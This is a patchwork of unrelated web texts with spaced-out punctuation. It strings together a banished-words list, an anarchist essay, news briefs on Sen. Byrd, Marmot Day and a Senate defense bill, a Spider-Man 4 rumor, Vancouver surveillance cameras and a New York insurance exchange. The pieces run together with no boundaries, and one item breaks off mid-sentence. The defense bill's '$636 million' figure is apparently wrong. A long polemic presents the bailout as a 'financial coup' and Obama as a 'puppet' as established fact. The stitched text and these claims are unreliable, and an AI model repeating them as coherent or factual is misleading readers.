George W. Bush appointed 47 people to 35 czar jobs ; Pres. Obama , eight appointments to 38 positions .
" First it was a ' drug czar ' [ banished in 1990 ] .
This year gave us a ' car czar . '
What 's next ?
A ' banished words czar ' ? " -- Michael F. Raczko , Swanton , Ohio .
" We have appointed a czar of such - and - such ; clearly that 's better than a ' leader , ' ' coordinator ' or ' director ' ! -- Derek Lawrence , Thunder Bay , Ont .
 The president has been handing these " czar " positions out like party favors . 
 Scott Lassiter , Houston , Tex .
TWEET
And all of its variations tweetaholic , retweet , twitterhea , twitterature , twittersphere
" People tweet and retweet and I just heard the word ' tweet ' so many times it lost all meaning .
 Ricardo , Merida , Yucatan , Mexico .
Mikhail Swift of Hillman , Mich .
says the tweeting is " pointless yet has somehow managed to take the nation by storm .
I 'm tired of hearing about celebrity X's new tweet , and how great of a tweeter he or she is . "
" I do n't know a single non-celebrity who actually uses it , " says Alex Thompson of Sault St. Marie , Mich .
Jay Brazier of Williamston , Mich .
says she supposes that tweeters might be " twits . "
APP
" Must we b sbjct to yt another abrv ?
Why does the English language have to fit on a two - inch screen ?
I hate the sound of it .
I think I 'll listen to a symph on the rad . " -- Edward R. Bolt , Grand Rapids , Mich .
" Is there an ' app ' for making this annoying word go away ?
Why ca n't we just call them ' programs ' again ? "  Kuahmel Allah , Los Angeles , Calif .
SEXTING
Sending sexually explicit pictures and text messages through the cell phone .
" Any dangerous new trend that also happens to have a clever mash - up of words , involves teens , and gets television talk show hosts interested must be banished . "
 Ishmael Daro , Saskatoon , Sask. , Canada .
FRIEND AS A VERB
Came into popularity through social networking websites .
You add someone to your network by " friending " them , or remove them by " unfriending " them .
" I 'm certainly as much of a Facebook addict as the next person , but I 'm getting a little weary of ' friending ' people and being ' friended ' by them .
My daughter talks of ' sending friend requests , ' which does n't rankle me as much , so maybe we should all take her lead . "  John Wetterholt , Crystal Lake , Ill .
" ' Befriend ' is much more pleasant to the human ear and a perfectly useful word in the dictionary . "  Kevin K. , Morris , Okla .
TEACHABLE MOMENT
What might otherwise be known as ' a lesson . '
" It 's a condescending substitute for ' opportunity to make a point , ' " says Eric Rosenquist of College Station , Tex .
" If everything 's a ' teachable moment , ' we should all have teaching credentials , including the guy at the bar who likes to fight after one shot too many . "
 Kuahmel Allah , Los Angeles , Calif .
" This phrase is used to describe everything from potty - training to politics .
It 's time to vote it out ! "  Jodi , Youngstown , Ohio .
BROMANCE
" Have we really reached the point where being friends has to be described in a pseudo - romantic context ?
Just stop it already ! " -- Greg Zagorski , Washington , D.C .
" I am sick of combined words the media creates to make them sound catchier .
Frenemies ?
Bromances ?
Blogorrhea ?
I 'm going to scream ! "  Kaylynn , Alberta , Canada .
CHILLAXIN '
Nominated for several years .
We could n't chill about it anymore .
" Heard everywhere from MTV to ESPN to CNN .
A bothersome term that seeks to combine chillin ' with relaxin ' makes me want to be ' axin ' this word . "
 Tammy , Sault Ste. Marie , Mich .
" A made - up word used by annoying Gen - Yers . "  Chris Jensen , Fond du Lac , Wisc .
" Horrifying overuse , even in face - to - face conversation
It should receive bonus points for its ability to exhort the opposite reaction from the receiver . "  Bret Bledsoe , Cincinnati , Ohio .
OBAMA - prefix or roots ?
The LSSU Word Banishment Committee held out hope that folks would want to Obama - ban Obama - structions , but were surprised that no one Obama - nominated any , such as these compiled by the Oxford Dictionary in 2009 : Obamanomics , Obamanation , Obamafication , Obamacare , Obamalicious , Obamaland .
We say Obamanough already .
Lake Superior State University is located in Sault Ste. Marie , Michigan , along the U.S. / Canada international border .

Capital : A Diversion ?
The homesteading of the ruling class ’s unjustly acquired property is a major focus for many left - leaning market anarchists .
Many market anarchists cite Murray Rothbard ’s article “ Confiscation and the Homestead Principle , ” in which he argued that capitalist firms that received most of their profit from state intervention in the economy should be regarded as branches of the state , and their plant and equipment treated as unowned and subject to homesteading by their own workforces or the consumers they served .
Rothbard even spoke of anarchists seizing the state as a prelude to dismantling it , and nationalizing state capitalist property and handing it over to workers and consumers as part of the dismantling process .
Some anarchists take a similar view of progressive taxation of the super - rich , on the grounds that it ’s simply a corrective measure to the state policies that conferred enormous monopoly rents on the privileged classes in the first place .
But aside from the question of principle , I fear that this approach is a diversion from a strategic standpoint .
Before we talk of using the state as a mechanism to correct the results of state - conferred privilege , we should remember what states are and who they work for .
A state is the instrument for the political means of acquiring wealth , run for the benefit of a ruling class ; and by definition , a majority of producers can never directly control the state .
Many of the plutocrats , especially those in the “ progressive ” strand , are probably smart enough to figure out the crisis tendencies , like overproduction and underconsumption , that result from unlimited privilege , and to act through their state to correct the worst excesses of the system .
The “ progressive ” or “ green ” strand of capitalism , represented by Bill Gates , T. Boone Pickens , et al , sees a partial redistribution of purchasing power as a corrective mechanism to guarantee that the overall system of privilege and wealth extraction continue to the maximum feasible extent .
You have to spend money to make money .
It ’s just another part of the same general theme I keep harping on : the factions of organized capital that support liberal Democrats and New Deal - style consensus capitalism are like a smart farmer who figures he ’ll maximize his wealth in the long run by spending a bit more now to take good care of his draft animals .
And the amount of money they ’re taxed to fund welfare to the underclass , in order to prevent destabilizing levels of hunger and homelessness , is a small fraction of what they extract from the non-destitute working and middle class , through unequal exchange .
So people like Bill Gates probably welcome progressive taxation as a form of innoculation against things like having their copyrights and patents voided .
On the other hand , if we do our jobs right , seizing the privileged classes ’ surplus wealth will be a moot point , because before we ’re done it will all be worthless to them anyway .
The state capitalists have pursued models of extensive growth from adding more subsidized inputs , because the state has given them preferential access to capital and large tracts of land .
The counter - economy , as a matter of necessity , must follow an intensive growth model based on more efficient extraction of value from the same level of inputs , and on reducing the capital outlays and overhead required to support a comfortable standard of living .
The process was envisioned by Vinay Gupta in “ The Unplugged ” as “ buying out at the bottom ” : workers and consumers drop out of the state capitalist system and take advantage of new , low - capital outlay , low - overhead technologies .
The upshot will be that , as workers drop out of the system and consumers stop buying its products , the state capitalists will find their large agglomerations of land and capital to be worthless to them : idle factories and idle plantation farms , with a shrinking number of people willing to work them or buy their products .
We ’re beginning to see the fulfillment of that vision right now , as the reduced costs of doing things is making most investment capital superfluous .
As Rushkoff described it , the desktop and network revolutions reduced the capital outlays required for production in the information and culture industries by two orders of magnitude .
And we ’re seeing a similar development , with the micromanufacturing revolution , in the capital costs of physical production .
The main struggle , from the standpoint of the counter - economy , wo n’t be remedying the lack of capital — the capital is becoming increasingly useless to us .
The struggle will be combating the state capitalist system ’s attempts to prohibit doing things more cheaply and efficiently .
Reducing the capital outlays and overhead costs of the countereconomy , and defending it against attempts at suppression , are our main revolutionary orders of business .
I did n't go through all the replies , so if this is a repost , I apologize ...
The photogrpaher is clearly using a monopod .
Notice his face is too far forward .
In order to actually look through viewfinder , his nose would have to be behind the camera .
I think he is positioned forward to hide the monopod , which is mount to the bottom of the camera .

John
Sen . Robert Byrd Asks : ' How Much American Blood ? '
Senate 's oldest member says no additional troops for Afghanistan .
Oct. 14 , 2009  -- Sen. Robert Byrd , D - W.Va. , is n't seen much in public anymore .
At 91 , he rarely votes and almost never gives speeches .
But today he dramatically appeared on the Senator floor to denounce the idea of sending more U.S. troops to Afghanistan .
" How much more will all this cost ? "
Byrd demanded .
" How much in dollars ; how much in terms of American blood ? "
Speaking slowly and forcefully from his wheelchair , Byrd directly challenged counter - insurgency strategy proposed by Gen. Stanley McChrystal , the U.S. commander in Afghanistan , and Gen. David Petraeus , the commander of U.S. Central Command .
" I believe they have certainly lost sight of America 's primary strategic objective - - namely to disrupt and de-fang al Qaeda and protect the American people from future attack , " Byrd said .
< Byrd is the longest - serving senator in American history .
And to many anti-war activists he speaks with moral authority as one of the earliest and most forceful voices in the Senate against the Iraq war .
" I have become deeply concerned that in the eight years since the September 11 attacks , the reason for the U.S. military mission in Afghanistan has become lost , " Byrd said , " consumed in some broader scheme of nation - building which has clouded our purpose and obscure our reasoning . "
Regarding McChrystal 's request for more troops , Byrd asked , " What does General McChrystal actually aim to achieve ? "
Byrd 's words put him at odds with another Senate Democratic old - timer , Appropriations Chairman Senator Daniel Inouye , D - Hawaii .
Senators at Odds Over Afghanistan
Inouye , who is a Medal of Honor winner and a long - time friend of Byrd , did not endorse a specific number of troops , but he said " appropriate resources " will be needed .
JUNEAU , Alaska — Alaska now has its own version of Groundhog Day .
Then - Gov. Sarah Palin signed a bill last year to make every Feb. 2 Marmot Day in Alaska .
The bill was introduced by Sen. Linda Menard , a Wasilla Republican .
Because groundhogs are not common in Alaska , Menard says it made sense for the marmot to become Alaska 's version of Punxsutawney Phil , the Pennsylvania groundhog famed for his winter weather forecasts .
Menard 's bill did n't give marmots any weather forecasting duties , but she hopes the state will create educational activities around the animal .

Washington ( CNN ) --
The Senate passed a $ 636 million defense spending bill Saturday by an 88 - 10 vote .
Debate on the bill wrapped up Friday , setting the stage for the unusual Saturday morning final vote on the measure .
The Senate voted 63 - 33 Friday morning to end debate on the measure -- three votes more than required to break a GOP filibuster .
Under Senate rules , 30 hours must pass before final passage , which would in turn allow the chamber to resume consideration of the politically contentious health care bill .
Democrats said Republicans tried to slow consideration of the defense bill largely to prevent the passage of health care legislation before the Democrats ' self - imposed Christmas deadline .
The House of Representatives passed the spending bill 395 - 34 Wednesday .
The measure includes money for the wars in Iraq and Afghanistan but does not cover additional costs expected for the 30,000 U.S. troops the Obama administration announced it will send to Afghanistan next year .
A separate request for those troops is expected to come up for a vote next spring .
Democrats also tacked onto the bill short - term extensions of several programs set to expire at the end of 2009 , including a two - month extension of unemployment assistance and health care coverage for those who have lost their jobs .
And because the defense bill is the last spending measure both chambers of Congress will vote on this year , Democratic leaders also attached other extensions for programs they were unable to tackle by year 's end .
To head off a major cut in payments to doctors , the bill keeps in place for two more months the current rates Medicare pays to physicians .
The temporary " doc fix " delays until next year the debate over how to pay for a permanent fix for these rates .
The bill also extends some key provisions of the Patriot Act for two months .
House Democrats wanted to include a six - month continuation of those items but were forced to scale back because Senate Democratic leaders made it clear they would not be able to pass a longer extension this year .
Tensions were palpable on the Senate floor early Friday , with Democrats suggesting Republicans were sacrificing the defense of the nation to stall overhauling health care .
" Many who are filibustering this defense appropriations bill tonight are filibustering because they want to delay ... the health care reform legislation from being voted on , " said Sen. Carl Levin , D - Michigan .
" So the bill that provides the funding to support our men and women in uniform who are serving on the front lines , often under arduous and dangerous circumstances , to protect our nation is being filibustered to keep the Senate from acting on another unrelated piece of legislation .
This is not only unbelievable ; it is unconscionable . "
But the Republican whip , Sen. Jon Kyl , R - Arizona , was having none of it .
" Do n't blame Republicans for the fact that this bill comes before us a week before Christmas and , therefore , we have to act on it at this point in time .
Republicans had nothing to do with that timing , " Kyl said .
The Economic Elite vs. the People of the United States of America : Part IV
Although most of the Economic Elite live and operate inside the US , they are not concerned for our future .
To them , the entire world is theirs and they work intimately with other elites throughout the world against the interests of the US public .
Ever since the days of Henry Ford , the Economic Elite have needed a thriving US middle class to increase growth and profits , but now , in the global economy , they view the US middle class as obsolete .
They increasingly look globally for profits and they would rather pay cheap labor in countries like China and India .
On top of the millions of jobs they have already shipped overseas to increase profits at our expense , they are planning to ship an additional 25 % of current US jobs overseas as well .
They now see us as the biggest obstacle to their continued consolidation of wealth and resources .
This is why they have stepped up their attack on us .
If you want further proof of this , all one needs to do is study the Wall Street bailout .
The entire bailout is strategically designed to eliminate the US middle class .
Every time you hear the word “ bailout , ” you should think “ coup d’état . ”
Here is the definition of coup d’état :
A coup d’état or coup for short , is the sudden unconstitutional deposition of a government , usually by a small group of the existing state establishment … to replace the deposed government with another … .
A coup d’état succeeds when the usurpers establish their legitimacy if the attacked government fail to thwart them , by allowing their ( strategic , tactical , political ) consolidation and then receiving the deposed government ’s surrender ; or the acquiescence of the populace and the non-participant military forces .
Typically , a coup d’état uses the extant government ’s power to assume political control of the country .
In Coup d’État : A Practical Handbook , military historian Edward Luttwak says : ‘ A coup consists of the infiltration of a small , but critical , segment of the state apparatus , which is then used to displace the government from its control of the remainder ’ , thus , armed force ( either military or paramilitary ) is not a defining feature of a coup d’état .
The bailout was a financial coup , an intelligence operation to seize control of the US economy and tax system .
It is similar to what the Economic Elite have done through the International Monetary Fund ( IMF ) in many other countries throughout the world .
It is clearly a case of economic imperialism .
When financial coups are carried out in other countries , they call it a Structural Adjustment Program ( SAP ) .
The end result is the theft of working class wealth , the privatization of public functions and resources , rising unemployment , the elimination of the middle class and increasing taxation and debt that turns the overwhelming majority of the nation into a peasant class .
This is exactly the track we are on now .
Just look at how they have already done this in many other countries , and then look at the “ bailout . ”
The success of the coup is clear by the control of the US Treasury by Goldman Sachs criminal masterminds Hank Paulson and Tim Geithner , and the continued control of the Federal Reserve by Ben Bernanke .
In 1970 , Hank Paulson began his career in the Pentagon working for Secretary of Defense Melvin Laird .
In 1972 , he then moved to the White House , where he worked for the Nixon Administration .
He was “ the assistant to John Ehrlichman during the events of the Watergate scandal for which Ehrlichman was convicted , and sentenced to prison . ”
After Paulson ’s disgraced exit from the political world , he joined Goldman Sachs in 1974 , eventually becoming CEO in 1999 when he led an effort to force out Goldman ’s previous CEO John Corzine .
While leading Goldman , Paulson developed very intimate relations with members of the Chinese elite , visiting the country over 70 times .
In 2004 , during his time as Chairman and CEO of Goldman Sachs , Paulson personally led a successful effort to get the SEC to remove the “ net capital rule , ” which was a “ requirement that their brokerages hold reserve capital that limited their leverage and risk exposure . ”
This was the biggest reason why the economic crisis happened .
With the “ net capital rule ” out of the way , Goldman Sachs and other major Wall Street firms with over $ 5 billion in assets were free to engage in high risk / high reward behavior .
This led to the housing bubble with the creation of high risk speculation , essentially rigged Ponzi - style scams like “ mortgage - backed securities , credit derivatives , and credit default swaps … and other exotic structured finance instruments that only highly - trained mathematicians understand , based on models that are beyond the comprehension of most traders . ”
After making over $ 700 million on these shady high risk activities that created a ticking time bomb in our economy , Paulson left Goldman Sachs to run the US Treasury .
Shortly after that , the speculative trading scams blew up , and there was the man who played the most pivotal role in causing the economy to crash now running the US Treasury and in charge of “ maneuvering ” trillions of dollars in national wealth to “ fix ” the economy .
It was time for Paulson , along with his close confidant Tim Geithner , then heading the NY Federal Reserve Bank , and Federal Reserve Chairman Ben Bernanke , to engineer the greatest theft of wealth in history with the “ bailout . ”
Paulson quickly brought in several former Goldman Sachs partners to help him engineer the coup .
A pivotal Paulson asset was former Goldman executive Dan Jester , who Paulson quickly hired as a “ contractor . ”
As Robert E. Prasch recently reported , “ Jester was never appointed by Congress or otherwise vetted before taking up his role as the Treasury ’s de facto central player in the crucial decisions that marked that fall ’s bailout of Wall Street . ”
Paulson ’s most publicized move was the $ 700 billion Troubled Assets Relief Program ( TARP ) .
This was a blatant no -strings attached giveaway of taxpayer money , handed directly to Wall Street ’s biggest players .
To oversee the TARP operation , Paulson brought in Goldman Sachs Vice President Neel Kashkari .
Another egregious unilateral move by Paulson was installing Edward Liddy , one of his former board members at Goldman Sachs , as CEO of AIG .
Liddy was the Chairman of Goldman ’s Audit Committee , making him the most knowledgeable person regarding Goldman ’s collateralized debt obligations ( CDOs ) .
Paulson knew these CDOs would go bust because they were based on fraudulent activities , essentially a massive Ponzi scheme .
So Paulson and Goldman Sachs covered their risk by insuring them through AIG , making it pivotal to save AIG and have one of his most trusted allies run the company .
With Liddy in place , billions of taxpayer dollars were secretly funneled by the Geithner - led NY Federal Reserve through AIG to Goldman Sachs and several other Wall Street elite counterparties .
Without the AIG bailout , Goldman Sachs would have collapsed as a result of their own Ponzi scheme .
The assassinations of Goldman rivals Bear Stearns and Lehman Brothers , and the forced Bank of America acquisition of Merrill Lynch were all equally scandalous actions as well .
The hidden hand of the Bernanke - led Federal Reserve ’s secret “ black magic ” tactics — which created and distributed trillions of dollars — turned Morgan Stanley and Goldman Sachs into bank holding companies overnight , which gave them access to trillions of dollars to further manipulate the market and create record setting profits .
Every step of the way , the economic terrorist organization led by Paulson , Geithner and Bernanke held our economy hostage by declaring that all their demands must be met or the entire economy would be destroyed , as a result of the very actions the players being rewarded had taken .
( I do n’t use the words “ economic terrorists ” as hyperbole .
The threat posed by them and the amount of death , destruction and misery they have already caused the United States is much greater than that caused by Bin Laden and Al - Qaeda – it ’s not even close . )
Through the crisis , the fundamental structure of the stock market has been proven to be a scam .
The Ponzi scheme activities , outright market manipulation and massive worldwide fraud perpetrated by Goldman Sachs , JP Morgan , Morgan Stanley , Citigroup , AIG , the three major ratings agencies and several other Wall Street elite firms are blatant .
Just in the housing and oil futures markets alone , the criminal activity and economic theft is in the multi-trillions .
By looking the other way , the SEC , Congress and Presidents Bush and Obama are complicit .
An analysis of actions taken , or most often not taken , by the leaders of both the Republican and Democratic parties prove that they are now accomplices .
They have not only let it happen ; they continue to look the other way and have been stonewalling laws , investigations and prosecutions in what is clearly criminal activity .
If we had a nation of law , none of these things would have happened .
This proves to anyone who cares to look that we now live in a Banana Republic .
Our democracy has clearly become a farce .
The overwhelming majority of our politicians are now on the Economic Elite payroll .
This financial coup started under Hank Paulson in the Bush Administration and has been carried through , without even the slightest hitch , under Geithner in the Obama Administration , and all along Ben Bernanke has been leading the Federal Reserve .
Bernanke ’s reconfirmation shows you who the co-conspirators are – just look at the members of Congress who voted for it .
All three branches of our government are now complicit in what is literally the greatest theft of wealth in history , along with a mainstream “ news ” media that keeps going about their “ reporting , ” as if this was n’t a crime , business as usual .
Nothing to see here …
Obama ’s Role
As hard as it is for many Americans to admit , after a year in office it is now obvious , to those who study policy decisions , that Obama ’s rhetoric is very far from the reality of his actions .
Outside of the tough talk Obama gives concerning “ Wall Street Bankers , ” all evidence clearly demonstrates that he is their puppet .
The list of decisions that he has made to support the Economic Elite at our expense is already extensive .
As mentioned before , the fact that the bailout started under Bush and went straight through without a hitch under Obama is proof enough .
On top of this , Obama ’s campaign was heavily financed by Goldman Sachs , and prior to the election Obama often spoke with Paulson .
An analysis of phone records shows that Obama and Paulson engaged in 26 direct calls prior to the election .
“ Paulson placed more than twice as many individual outgoing calls to [ candidate ] Obama ( 14 ) as to President Bush ( 6 ) . ”
As soon as Obama was elected , he got rid of all the economic advisors he had during his campaign and replaced them with Wall Street insiders who were committed to “ turning the bailout into an all - out giveaway . ”
He took the main players that caused the economic crisis to begin with , and put them in charge of economic policy .
Right from the start he appointed Tim Geithner , Paulson ’s right - hand man , to run the US Treasury .
Mark Patterson , a former Goldman Sachs lobbyist , then became Geithner ’s Chief of Staff with the direct approval of Obama .
Geithner has surrounded himself with many aides that formerly worked for Goldman Sachs , “ none of whom faced Senate confirmation . ”
Obama also allowed Adam Storch , a Goldman Sachs VP , to become “ the first chief operating officer of the Securities and Exchange Commission ’s enforcement division . ”
Obama even “ nominated Goldman Sachs executive Gary Gensler to head the Commodity Futures Trading Commission , which regulates futures markets . ”
Gensler was “ a high - level Treasury official in a 2000 , ” when he helped create a “ law that exempted the $ 58 trillion credit default swap market from oversight . ”
Another major player in the economic collapse was Larry Summers , who Obama quickly appointed as White House National Economic Council Director .
All of this is , in essence , the final stage of a coup d’état , with Obama now serving as their puppet .
Obama clearly has not held the thieves accountable .
He has emboldened them in ways that led to record setting profits and bonuses – bonuses that are 100 % a direct result of our tax money .
He let them take the money , keep the money , and now he lets them continue to make even more money .
Even now , with all his new anti-Wall Street talk , his proposals are extremely misguided and weak .
Obama always deceptively frames the bailout discussion in relation to the $ 700 billion TARP program .
He , along with the mainstream media , always seems to gloss over the fact that the bailout is much more than just the TARP program .
TARP is a mere 2 % of this multifaceted scam .
His proposal of a tax on Wall Street firms to get some of our tax money back is estimated to bring in $ 90 billion over the next ten years .
That works out to $ 9 billion a year , compare that to the $ 150 billion in bonuses handed out by these same firms … just in the past year !
The top Wall Street firms would no longer even exist if we did n’t bail them out .
Their profits are a direct result of our tax money .
If Obama is serious about getting our money back , 100 % of the record - breaking bonus money that these thieves gave themselves should be going back into the tax system that it came from to pay down our national debt , lower our tax rates and create jobs .
The $ 150 billion in bonuses handed out this year cost you $ 500 of your hard - earned money .
For a family of four , that ’s $ 2000 that was taken from you and your family just this year and given directly to Wall Street bonuses .
Think about that …
Your personal money was taken from you and your family , and given directly to Goldman Sachs CEO Llyod Blankfein .
In fact , your direct gift to Wall Street is much more than that ; the $ 2000 your family lost was just for this year ’s bonuses , much more of your money was given away in the bailout .
The real size of the bailout is estimated to be $ 14 trillion , which works out to be $ 46,662 for every man , woman and child in America .
On top of being bailed out with our tax money , Goldman Sachs , which just had its most profitable quarter in its 140 - year history , only paid 1 % in taxes in 2008 !
And now that Obama has given trillions of our dollars to Wall Street , he is all of a sudden so concerned about our national deficit .
That is disgraceful !
When it came to the Economic Elite he could give away trillions , but when it comes to the social infrastructure of the American public and creating job programs , we all of a sudden have to be tight with our tax money and make “ painful choices . ”
When looking at Obama ’s latest $ 100 billion jobs program , again , compare that to the $ 150 billion in bonuses .
If you want to know if Obama is serious about creating jobs , just look at where he gave his big “ Jobs Speech ” – at the Business Roundtable affiliated Brookings Institution .
Thus again , confirming where his true loyalties lie .
Obama ’s sudden change of heart after the Massachusetts Senate election defeat is still more empty rhetoric .
His new found support for Paul Volcker , and his proposals to bring back Glass - Steagall type laws to prevent another economic catastrophe sound great on the surface , but then you find out that Wall Street firms have already figured out ways around these proposed laws .
While it would be great to have Volcker creating the rules over the Goldman Sachs - led team at the Treasury now , he is himself a former Federal Reserve Chairman who represents JP Morgan Chase interests .
Jamie Dimon , current JP Morgan Chase CEO and Business Roundtable member , is considered by Obama to be a possible replacement for Geithner at the Treasury .
Replacing Goldman
Sachs interests with JP Morgan interests is hardly change for the 99 % of Americans who have seen their interests ignored thus far .
JP Morgan and Goldman Sachs are two heads of the same monster .
An analysis of the “ Volcker Rules ” shows you the essence of what Obama is all about .
The “ Volcker Rules ” are just more propaganda .
First off , the rules do not go far enough .
Simon Johnson testified before the Senate Banking Committee and summed them up by saying : “ while the principles behind these proposed rules are exactly on target … the specific rule changes would need to be much tougher if they are to have any effect . ”
Johnson earlier exposed the “ Volcker Rules ” to merely be a “ marketing slogan . ”
Jeff Madrick , writing for the Roosevelt Institute , rightly questioned if Obama ’s economists even did their homework when putting together the rule .
“ What is disturbing is how poorly the Volcker rule has been thought through .
When first announced , it sounded like a worthy and needed step in the right direction , and a suggestion the Obama team was waking up to reality .
But I also expected more sophisticated details to come .
So far , there are none … it looks like they did n’t give it much thought before announcing the plan .
This is a critical error in judgment . ”
Even if the flawed laws make it to the Senate floor , the Banking Committee has come out strongly against them as being too little , too late .
To sum this all up , this is another case of Obama trying to make it look like he ’s doing something , when in reality , he is n’t doing anything .
This is similar to Obama ’s $ 75 billion taxpayer funded foreclosure - prevention program that has been a spectacular failure in stemming the foreclosure crisis .
The Obama Administration knew the program was n’t working from the start , but they just sat back and let it continue to fail , wasting billions of taxpayer dollars in the process .
Even Neil Barofsky , the special inspector general for the TARP program , said the following in his January 30th report to Congress : “ It is hard to see how any of the fundamental problems in the [ financial ] system have been addressed to date … .
Even if TARP saved our financial system from driving off a cliff back in 2008 , absent meaningful reform , we are still driving on the same winding mountain road , but this time in a faster car . ”
Now that the “ Too Big to Fail ” Wall Street elite know that the government will come in to bail them out , they are engaging in even riskier behavior than before .
Theodore Roosevelt once declared in a situation much like our current crisis , “ Corporation cunning has developed faster than the law of nation or state .
Corporations have found ways to steal long before we have found that they were susceptible to punishment for theft .
But sooner or later , unless there is a season of readjustment , there will come a riotous , wicked , murderous day of atonement … .
These fools on Wall Street think that they can go on forever !
They can’t ! ”
It is hard to face the fact that we have been so taken advantage of and abandoned by the very people we supported and had put our hope and faith into .
Americans need to understand that Obama , along with most of the Democrats and Republicans are not looking out for our best interests .
Part V : “ Overcoming the Divide and Conquer Strategy ” will be posted on Wednesday .
Over Christmas , reports ran rampant that Spider - Man 4 was having problems .
Now those rumours have been all - but confirmed by Hollywood insider Nikki Finke on her blog .
Verifying that issues with the film ’s villains are to blame , Nikki published an email sent out to the visual effects team that stated “ Sam Raimi has story issues [ that ] need to be resolved before we are ready to shoot ” .
Apparently , Raimi and Sony are still at loggerheads over who should be the villain ( or villains ) in the fourth Spidey flick .
The script is currently being given another overhaul by screenwriter Alvin Sargent , who penned the first two web - slinging outings .
Nikki added : “ Raimi and Sony are anxiously waiting for still another version from screenwriter Alvin Sargent , who wrote Spidey 2 & 3 and is married to Spidey franchise producer Laura Ziskind . ”
Meanwhile , an insider has stated that it ’s unlikely the film ’s original release date of May 11 , 2011 will be made ( though take that one with a pinch of salt ) .
Really , you ca n’t blame Raimi for wanting to get this right .
Spider - Man 3 came under fire for its convoluted plotting , mostly thanks to its over - abundance of villains .
So it ’s vital that this aspect of the fourth film is done right .
This kind of thing happens in Hollywood all the time .
More importantly , Sony know how much of a money - grabber the Spider - Man franchise is , so they ’ll want to get the ball rolling as soon as possible .
Let ’s just hope Raimi does n’t walk before that happens .
Which villain (s ) do you want to see in Spidey 4 ?

Nearly 1,000 new surveillance cameras are here to stay

Security cameras will stay on Vancouver streets after the Olympics have gone
VANCOUVER — When the last of the Olympic athletes ski , skate and slide out of town , Vancouverites will be left with an unexpected legacy : 970 cameras .
“ Security investment always leaves a good legacy of security for the country , ” International Olympic Committee President Jacques Rogge told media gathered last February in Whistler , marking the one year countdown to the Games .
The security bill for the Olympics is expected to reach the $ 1 billion mark .
A March 2009 Vancouver city report includes the total cost of installing Closed Circuit Television ( CCTV ) systems .
The Vancouver 2010 - Integrated Security Unit ( V2010 - ISU ) will pay $ 2.1 million , in addition to the $ 435,000 the province is contributing .
But all costs do not appear on the balance sheet .
There are also social costs , such as the diminished personal privacy in public spaces .
In March 2009 , Philip Boyle and Kevin Haggerty from the University of Alberta , published a report about surveillance and the Vancouver Olympics .
“ Public officials occasionally use the pretext of the Olympics to introduce forms of surveillance that the public might oppose in any other context , capitalizing on the fact that in anticipation of the Games citizens tend to be more tolerant of intrusive security measures , ” wrote Boyle and Haggerty in Privacy Games : The Vancouver Olympics , Privacy , and Surveillance .
The apparent acceptance of increased surveillance is something that requires a sober second thought , according to Adrienne Burk , professor in Sociology and Anthropology at Simon Fraser University .
“ It ’s important to ask ourselves what happens socially when we set up this kind of system of monitoring , ” she told The Dominion .
“ Does the presence of cameras transmitting our images to unknown viewers help us know our neighbors better , or less well ?
Is there an increase in fear and suspicion , or in feelings of community and safety ?
We have to be careful when cameras are introduced for one reason , but left in place , or re-deployed for another , without these contextual conversations taking place . ”
Although the Vancouver city report Privacy Games : The Vancouver Olympics , Privacy , and Surveillance points to the cruise ship terminal and entertainment district as key areas the cameras will be installed , the City of Vancouver and the V2010 - ISU have not been specific regarding locations for all CCTV systems .
“ Approximately 900 CCTV security cameras [ have been ] installed at venues for the Winter Games with another 50 - 70 CCTV security cameras installed in the urban domain , " states the report .
" The urban domain consists of areas where the public gather outside a venue , ” reads the V2010 - ISU 's website .
The urban domains have been dubbed " Safe Assembly Areas " by the ISU .
These are areas , also known as " Free Speech Zones , " or " Protest Pens , " where people are allowed to engage in lawful protest .
Minimal research has been conducted on the number of surveillance cameras that currently exist in the Downtown area .
A collaborative effort between the Vancouver Public Space Network and the Simon Fraser University Surveillance Project aims to change that .
Late in August , volunteers set out to count and record the locations of cameras they could spot on city streets and alleyways .
“ Surveillance cameras are distributed primarily in focused local areas or higher end shopping areas , ” David Eby , Executive Director of BC Civil Liberties Association told The Dominion in a telephone interview .
Eby calls attention to the irony of the scenario of increased cameras in Vancouver .
“ You end up with a paradoxical situation where low income and middle income neighborhoods essentially , financially and logistically , facilitate the displacement of crime into their neighborhoods . ”
People who are engaged in so - called “ undesirable activities ” such as panhandling in shopping districts like Robson Street or Gastown , may end up being displaced from public spaces as a result of security cameras that business owners argue are necessary in order to increase consumer confidence .
BC Civil Liberties has received confirmation from the ISU that no new cameras will be installed in the Downtown Eastside , an area of Vancouver that is the poorest off - reserve postal code in Canada .
The Carnegie Community Action Project ( CCAP ) identified some of the the problems with CCTV back in 1999 when it challenged the VPD ’s efforts to install cameras in Vancouver ’s Downtown Eastside .
“ Cameras do not provide employment or housing opportunities ...
Rather than targeting business - operators or landlords who take advantage of poverty and addictions , [ the use of CCTV ] focuses on the behavior of those individuals who do not fit the expectations or mores of the camera monitors , ” their report states .
Ten years later , the CCAP report is still relevant to the concerns about the social costs of these cameras in the context of the Olympics and the Downtown Eastside .
Andrew Pask , director of the Vancouver Public Space Network , cautions that CCTV cameras should only be seen as a “ tool of last resort . ”
The pattern of Olympic cities , including Athens , Turin , and Beijing , has been to retain surveillance cameras after the Games .
The City of Vancouver has admitted the $ 435,000 worth of cameras will not be temporary , but part of a “ redeployable unit . ”
“ You know , witnessing has always been a fundamental aspect of democracy , involving actors , observers , and recording of incidents , ” professor Burk indicates .
“ But cameras complicate that relationship , because the viewers and actors can be removed from each other , and recordings substantively altered , " she said , arguing for a public debate before more cameras are installed .

Officials associated with the project said they believed it could eventually generate 2,000 to 3,000 jobs , both for market participants and regulators .
The exchange would be regulated by the state .
It is unrelated to the Obama administration ’s proposals to allow uninsured individuals to buy health coverage through exchanges .
The New York insurance superintendent , James J. Wrynn , said it would be easier for New York to create an insurance exchange than for most other states because it tried to start such an exchange in the 1980s .
That attempt failed , but the laws allowing it are still on the books , Mr. Wrynn said .
He said the 1980s effort was doomed because the companies participating were not required to have adequate capital and did not always understand the risks they were taking on .
The market was also “ soft ” then , meaning the participating insurers had a hard time charging large enough premiums to both cover their risks and turn a profit .
Mr. Wrynn said New York had been studying what went wrong with the earlier exchange and would see to it that the mistakes were not repeated .
He said the state was about to start working with people from various financial institutions in the private sector to draft the rules and procedures for the exchange .
Members of the working groups are to be named on Thursday .
Another crucial difference between the 1980s and now is the rise of hedge funds and other unconventional financial companies , which might want to try insuring catastrophic risks to balance investment portfolios .
Such investors would participate directly in insurance syndicates , underwriting risks without having to become licensed insurers .

‘ Fifth Taste ’ Umami Now Available In Tube Form at Grocery Stores
Umami , which is known as the fifth flavor , is hard to define .
But now , you can find umami extract in a tube in English grocery stores — and in these six ingredients .
